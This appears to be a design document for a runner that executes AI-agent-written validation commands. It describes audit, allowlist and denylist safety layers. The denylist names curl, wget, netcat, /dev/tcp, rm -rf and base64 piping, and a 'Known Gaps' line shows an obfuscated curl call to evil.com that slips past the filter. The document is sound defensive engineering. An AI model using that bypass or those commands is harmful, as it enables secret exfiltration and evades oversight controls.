# Validation Command Safety

## Overview

The validation command safety system prevents agent-authored shell commands from causing harm when executed by the runner. Since agents write `validation_commands` in `tasks.json` and the runner executes them with `bash -c`, a malicious or hallucinated command could delete files, exfiltrate secrets, or modify remote systems. The safety system applies three defence layers — audit logging, allowlist filtering, and denylist detection — before any validation command runs.

## How It Works

Every validation command passes through `_check_validation_cmd()` before execution. The function applies three layers sequentially:

```
Command from tasks.json
        │
        ▼
┌─ Layer 1: Audit Log ────────────────┐
│  log_warn "VALIDATION EXEC: $cmd"   │
│  (always emitted, no filtering)     │
└──────────────┬──────────────────────┘
               │
               ▼
┌─ Layer 2: Allowlist Filter ─────────┐
│  Only active when                   │
│  VALIDATE_COMMANDS_ALLOWLIST is set  │
│                                     │
│  Colon-separated ERE patterns       │
│  e.g. "^npm :^make :^pytest"        │
│                                     │
│  No match → BLOCKED (return 1)      │
│  Match    → continue to Layer 3     │
└──────────────┬──────────────────────┘
               │
               ▼
┌─ Layer 3: Denylist Detection ───────┐
│  Checks against dangerous patterns: │
│  rm -rf, curl, wget, eval, sudo,   │
│  ssh, scp, nc/netcat, base64|,     │
│  /dev/tcp, dd if=, chmod 777,      │
│  git push --force, >.env            │
│                                     │
│  STRICT=true  → BLOCKED (return 1) │
│  STRICT=false → WARNING (return 0) │
│  No match     → PASS (return 0)    │
└─────────────────────────────────────┘
```

### Caller Sites

The function is called from two places in `lib/work.sh`:

1. **Pre-flight validation** (`run_preflight_validation`, line ~198) — Runs all unique `validation_commands` from every task at work-mode startup to capture a baseline. Blocked commands are recorded with `exit_code: 1` and `"BLOCKED by validation safety check"` output.

2. **Post-cycle validation** (`run_post_work_validation`, line ~265) — Runs `validation_commands` for the current task after each work cycle. Results are written to `last-validation-results.json` and injected into the next cycle's prompt so the agent can react to failures.

### Validation-to-Commit Gate

When `VALIDATE_BEFORE_COMMIT=true` (the default), `commit_work_changes()` reads `last-validation-results.json` and skips the commit if any command has a non-zero exit code. This keeps broken code uncommitted so the next cycle can fix it. The gate checks all entries except the `_summary` metadata key.

### Denylist Pattern Design

The denylist uses extended regex (`grep -qE`) with word-boundary markers (`\b`) to avoid false positives on compound command names. For example:
- `\bcurl\b` matches standalone `curl` but not `npm run curl-fetch`
- `\bwget\b` matches standalone `wget` but not `npm run wget-assets`

This was a deliberate fix (tracked as RL-039) to prevent legitimate npm scripts with denylist words in their names from being blocked.

### Execution Environment

Commands execute via `run_with_timeout 120 bash -c "$cmd"` in the `$DOCS_DIR` (target project root). They inherit the full shell environment including `ANTHROPIC_API_KEY` and any secrets. Output is captured and truncated to the last 30 lines before being stored in the results JSON.

## Key Components

| File | Responsibility |
|------|---------------|
| `lib/work.sh:24-82` | `_check_validation_cmd()` — three-layer safety gate |
| `lib/work.sh:176-233` | `run_preflight_validation()` — startup baseline check |
| `lib/work.sh:236-301` | `run_post_work_validation()` — post-cycle task validation |
| `lib/work.sh:322-394` | `commit_work_changes()` — validation-gated commit |
| `tests/test_validation_safety.sh` | 12 test cases covering all layers and edge cases |

## Design Decisions

**Why three layers instead of one?** The audit log provides visibility regardless of configuration. The allowlist is the strongest control (positive security model) but requires manual setup. The denylist catches obvious dangers with zero configuration. This layered approach lets operators choose their security posture: zero-config (audit + denylist warnings), moderate (`STRICT=true`), or locked-down (allowlist).

**Why is strict mode off by default?** Backward compatibility. Existing users who never set `VALIDATE_COMMANDS_STRICT` would see their previously-working commands suddenly blocked. The default warn-only behavior surfaces the risk without breaking workflows.

**Why pattern-based detection rather than a sandbox?** macOS has no practical kernel-level sandboxing for arbitrary shell commands. The runner targets developer machines where Docker-based isolation would add significant complexity. The denylist is a best-effort heuristic — the CLAUDE.md explicitly acknowledges it can be bypassed by obfuscation and recommends allowlists for high-assurance environments.

**Why truncate output to 30 lines?** Validation output is injected into the next cycle's prompt. Unbounded output would consume the agent's context window with test logs, leaving less room for reasoning. The last 30 lines typically contain the failure summary.

## Related Docs

- [Work Loop Orchestration](../orchestration/work-loop.md) — overall cycle flow that invokes validation
- [Prompt Assembly Pipeline](../configuration/prompt-assembly.md) — how validation results are injected into prompts

## Known Gaps

- The denylist is not exhaustive — obfuscated commands (e.g., `$(echo Y3VybA== | base64 -d) evil.com`) can bypass pattern matching. The allowlist is the recommended mitigation.
- No network-level isolation: commands can make outbound connections unless blocked by the denylist or an external firewall.
- The 120-second timeout per command is hardcoded in both caller sites, not configurable via environment variable.
